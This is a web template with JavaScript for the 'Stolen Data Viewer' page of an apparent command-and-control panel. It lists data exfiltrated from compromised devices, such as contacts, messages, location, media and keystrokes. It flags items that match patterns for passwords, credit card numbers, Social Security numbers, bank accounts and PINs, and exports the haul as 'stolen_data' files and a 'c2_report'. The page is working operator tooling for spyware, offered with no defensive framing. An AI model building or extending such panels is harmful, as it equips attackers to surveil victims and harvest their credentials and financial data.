{% extends "base.html" %}

{% block title %}Stolen Data - C2 Center{% endblock %}

{% block content %}
<div class="row mb-4">
    <div class="col-12">
        <h1><i class="fas fa-database"></i> Stolen Data Viewer</h1>
        <p class="text-muted">Browse and analyze exfiltrated data from compromised devices</p>
    </div>
</div>

<div class="row">
    <div class="col-lg-9">
        <div class="card">
            <div class="card-header d-flex justify-content-between align-items-center">
                <h5><i class="fas fa-table"></i> Exfiltrated Data</h5>
                <div>
                    <select class="form-select form-select-sm d-inline-block w-auto me-2" id="data-filter">
                        <option value="">All Data Types</option>
                        <option value="contacts">Contacts</option>
                        <option value="messages">Messages</option>
                        <option value="location">Location</option>
                        <option value="media">Media Files</option>
                        <option value="system">System Info</option>
                        <option value="keystrokes">Keystrokes</option>
                    </select>
                    <button class="btn btn-primary btn-sm" onclick="refreshData()">
                        <i class="fas fa-sync"></i> Refresh
                    </button>
                </div>
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-dark table-striped">
                        <thead>
                            <tr>
                                <th>Device</th>
                                <th>Data Type</th>
                                <th>Size</th>
                                <th>Timestamp</th>
                                <th>Preview</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="data-table">
                            <tr>
                                <td colspan="6" class="text-center">Loading stolen data...</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    
    <div class="col-lg-3">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-chart-pie"></i> Data Statistics</h5>
            </div>
            <div class="card-body">
                <div class="text-center mb-3">
                    <h4 id="total-data-size" class="text-primary">-</h4>
                    <p class="text-muted">Total Data Stolen</p>
                </div>
                
                <div class="mb-3">
                    <small class="text-muted">Data by Type:</small>
                    <div id="data-breakdown">Loading...</div>
                </div>
                
                <div class="mb-3">
                    <small class="text-muted">Most Active Device:</small>
                    <div id="most-active-device">Loading...</div>
                </div>
            </div>
        </div>
        
        <div class="card mt-3">
            <div class="card-header">
                <h5><i class="fas fa-exclamation-triangle"></i> Sensitive Data</h5>
            </div>
            <div class="card-body">
                <div id="sensitive-data-alerts">
                    <div class="text-muted">Scanning for sensitive information...</div>
                </div>
            </div>
        </div>
        
        <div class="card mt-3">
            <div class="card-header">
                <h5><i class="fas fa-download"></i> Export Options</h5>
            </div>
            <div class="card-body">
                <div class="d-grid gap-2">
                    <button class="btn btn-outline-primary btn-sm" onclick="exportData('json')">
                        <i class="fas fa-file-code"></i> Export as JSON
                    </button>
                    <button class="btn btn-outline-secondary btn-sm" onclick="exportData('csv')">
                        <i class="fas fa-file-csv"></i> Export as CSV
                    </button>
                    <button class="btn btn-outline-warning btn-sm" onclick="generateReport()">
                        <i class="fas fa-file-pdf"></i> Generate Report
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Data Details Modal -->
<div class="modal fade" id="dataDetailsModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content bg-dark">
            <div class="modal-header">
                <h5 class="modal-title">Data Details</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div class="row">
                    <div class="col-md-4">
                        <h6>Metadata</h6>
                        <div id="data-metadata">Loading...</div>
                    </div>
                    <div class="col-md-8">
                        <h6>Content</h6>
                        <div class="terminal" style="height: 400px;" id="data-content">
                            Loading content...
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" onclick="downloadDataItem()">
                    <i class="fas fa-download"></i> Download
                </button>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_js %}
<script>
let allData = [];
let selectedDataItem = null;

function loadData() {
    // Load all device data
    fetch('/api/devices')
        .then(response => response.json())
        .then(devices => {
            const promises = devices.map(device => 
                fetch(`/api/device/${device.device_id}/data`)
                    .then(response => response.json())
                    .then(data => data.map(item => ({
                        ...item,
                        device_id: device.device_id,
                        device_name: device.device_name
                    })))
            );
            
            return Promise.all(promises);
        })
        .then(deviceDataArrays => {
            allData = deviceDataArrays.flat().sort((a, b) => 
                new Date(b.timestamp) - new Date(a.timestamp)
            );
            
            updateDataTable();
            updateStatistics();
        })
        .catch(error => {
            console.error('Error loading data:', error);
            document.getElementById('data-table').innerHTML = 
                '<tr><td colspan="6" class="text-center text-danger">Error loading data</td></tr>';
        });
}

function updateDataTable(filteredData = null) {
    const data = filteredData || allData;
    const tableBody = document.getElementById('data-table');
    
    if (data.length === 0) {
        tableBody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">No data available</td></tr>';
        return;
    }
    
    let tableHtml = '';
    data.slice(0, 100).forEach((item, index) => { // Limit to 100 items for performance
        const sensitiveIndicator = isSensitiveData(item) ? 
            '<i class="fas fa-exclamation-triangle text-warning" title="Sensitive Data"></i> ' : '';
        
        tableHtml += `
            <tr>
                <td>
                    ${sensitiveIndicator}<strong>${item.device_name}</strong><br>
                    <small class="text-muted">${item.device_id.substring(0, 8)}...</small>
                </td>
                <td>
                    <span class="badge bg-info">${item.data_type}</span>
                </td>
                <td>${formatFileSize(item.file_size || item.data_content.length)}</td>
                <td>${formatTimestamp(item.timestamp)}</td>
                <td>
                    <small class="text-muted">
                        ${item.data_content.substring(0, 50)}...
                    </small>
                </td>
                <td>
                    <button class="btn btn-primary btn-sm" onclick="showDataDetails(${index})">
                        <i class="fas fa-eye"></i> View
                    </button>
                </td>
            </tr>
        `;
    });
    
    if (data.length > 100) {
        tableHtml += `
            <tr>
                <td colspan="6" class="text-center text-muted">
                    Showing first 100 of ${data.length} items. Use filters to narrow down results.
                </td>
            </tr>
        `;
    }
    
    tableBody.innerHTML = tableHtml;
}

function updateStatistics() {
    const totalSize = allData.reduce((sum, item) => 
        sum + (item.file_size || item.data_content.length), 0
    );
    
    document.getElementById('total-data-size').textContent = formatFileSize(totalSize);
    
    // Data breakdown by type
    const typeBreakdown = {};
    allData.forEach(item => {
        typeBreakdown[item.data_type] = (typeBreakdown[item.data_type] || 0) + 1;
    });
    
    let breakdownHtml = '';
    Object.entries(typeBreakdown).forEach(([type, count]) => {
        breakdownHtml += `
            <div class="d-flex justify-content-between">
                <span>${type}:</span>
                <span class="badge bg-secondary">${count}</span>
            </div>
        `;
    });
    document.getElementById('data-breakdown').innerHTML = breakdownHtml;
    
    // Most active device
    const deviceCounts = {};
    allData.forEach(item => {
        deviceCounts[item.device_name] = (deviceCounts[item.device_name] || 0) + 1;
    });
    
    const mostActive = Object.entries(deviceCounts)
        .sort(([,a], [,b]) => b - a)[0];
    
    if (mostActive) {
        document.getElementById('most-active-device').innerHTML = `
            <strong>${mostActive[0]}</strong><br>
            <small class="text-muted">${mostActive[1]} data points</small>
        `;
    }
    
    // Sensitive data alerts
    const sensitiveItems = allData.filter(isSensitiveData);
    let alertsHtml = '';
    
    if (sensitiveItems.length > 0) {
        alertsHtml += `
            <div class="alert alert-warning alert-sm">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>${sensitiveItems.length}</strong> items contain sensitive information
            </div>
        `;
        
        const recentSensitive = sensitiveItems.slice(0, 3);
        recentSensitive.forEach(item => {
            alertsHtml += `
                <div class="border-start border-warning ps-2 mb-2">
                    <small><strong>${item.data_type}</strong> from ${item.device_name}</small><br>
                    <small class="text-muted">${formatTimestamp(item.timestamp)}</small>
                </div>
            `;
        });
    } else {
        alertsHtml = '<div class="text-muted">No sensitive data patterns detected</div>';
    }
    
    document.getElementById('sensitive-data-alerts').innerHTML = alertsHtml;
}

function isSensitiveData(item) {
    const sensitivePatterns = [
        /password/i, /credit.*card/i, /ssn/i, /social.*security/i,
        /bank/i, /account.*number/i, /pin/i, /\d{4}-?\d{4}-?\d{4}-?\d{4}/
    ];
    
    return sensitivePatterns.some(pattern => 
        pattern.test(item.data_content) || pattern.test(item.data_type)
    );
}

function showDataDetails(index) {
    const item = allData[index];
    selectedDataItem = item;
    
    document.getElementById('data-metadata').innerHTML = `
        <p><strong>Device:</strong> ${item.device_name}</p>
        <p><strong>Type:</strong> ${item.data_type}</p>
        <p><strong>Size:</strong> ${formatFileSize(item.file_size || item.data_content.length)}</p>
        <p><strong>Timestamp:</strong> ${formatTimestamp(item.timestamp)}</p>
        <p><strong>Sensitive:</strong> ${isSensitiveData(item) ? '⚠️ Yes' : '✅ No'}</p>
    `;
    
    // Format content based on data type
    let formattedContent = item.data_content;
    try {
        const parsed = JSON.parse(item.data_content);
        formattedContent = JSON.stringify(parsed, null, 2);
    } catch (e) {
        // Not JSON, keep as is
    }
    
    document.getElementById('data-content').innerHTML = `<pre>${formattedContent}</pre>`;
    
    const modal = new bootstrap.Modal(document.getElementById('dataDetailsModal'));
    modal.show();
}

function downloadDataItem() {
    if (!selectedDataItem) return;
    
    const blob = new Blob([selectedDataItem.data_content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${selectedDataItem.device_name}_${selectedDataItem.data_type}_${selectedDataItem.timestamp}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function filterData() {
    const filterType = document.getElementById('data-filter').value;
    
    if (!filterType) {
        updateDataTable();
        return;
    }
    
    const filteredData = allData.filter(item => 
        item.data_type.toLowerCase().includes(filterType.toLowerCase())
    );
    
    updateDataTable(filteredData);
}

function exportData(format) {
    let content = '';
    let filename = '';
    let mimeType = '';
    
    if (format === 'json') {
        content = JSON.stringify(allData, null, 2);
        filename = `stolen_data_${new Date().toISOString().split('T')[0]}.json`;
        mimeType = 'application/json';
    } else if (format === 'csv') {
        const headers = ['Device Name', 'Data Type', 'Timestamp', 'Size', 'Content Preview'];
        const rows = allData.map(item => [
            item.device_name,
            item.data_type,
            item.timestamp,
            item.file_size || item.data_content.length,
            item.data_content.substring(0, 100).replace(/"/g, '""')
        ]);
        
        content = [headers, ...rows].map(row => 
            row.map(cell => `"${cell}"`).join(',')
        ).join('\n');
        
        filename = `stolen_data_${new Date().toISOString().split('T')[0]}.csv`;
        mimeType = 'text/csv';
    }
    
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showToast(`Data exported as ${format.toUpperCase()}`, 'success');
}

function generateReport() {
    const report = {
        timestamp: new Date().toISOString(),
        summary: {
            total_items: allData.length,
            total_size: allData.reduce((sum, item) => sum + (item.file_size || item.data_content.length), 0),
            devices: [...new Set(allData.map(item => item.device_name))].length,
            data_types: [...new Set(allData.map(item => item.data_type))],
            sensitive_items: allData.filter(isSensitiveData).length
        },
        data: allData
    };
    
    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `c2_report_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showToast('Comprehensive report generated', 'success');
}

function refreshData() {
    loadData();
    showToast('Data refreshed', 'success');
}

// Real-time event handlers
socket.on('new_data', function(data) {
    loadData(); // Refresh when new data arrives
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadData();
    
    // Setup filter handler
    document.getElementById('data-filter').addEventListener('change', filterData);
    
    // Auto-refresh every 60 seconds
    setInterval(loadData, 60000);
});
</script>
{% endblock %}
